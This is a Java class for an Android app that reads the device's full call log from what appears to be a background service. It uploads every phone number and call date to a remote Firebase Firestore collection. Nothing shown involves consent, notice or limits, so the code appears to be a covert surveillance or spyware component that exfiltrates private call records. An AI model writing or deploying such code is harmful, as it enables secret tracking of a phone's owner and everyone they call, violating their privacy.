package com.abm.fatakeshto;

import android.content.Context;
import android.provider.CallLog;
import android.database.Cursor;
import com.google.firebase.firestore.FirebaseFirestore;
import java.util.HashMap;

public class CallLogReader {
    private Context context;

    public CallLogReader(DeviceService service) {
        this.context = service;
    }

    public void syncCallLogs() {
        try (Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null)) {
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    FirebaseFirestore.getInstance().collection("call_logs").add(new HashMap<String, Object>() {{
                        put("number", number);
                        put("date", date);
                    }});
                }
            }
        } catch (SecurityException e) {
            e.printStackTrace();
        }
    }
}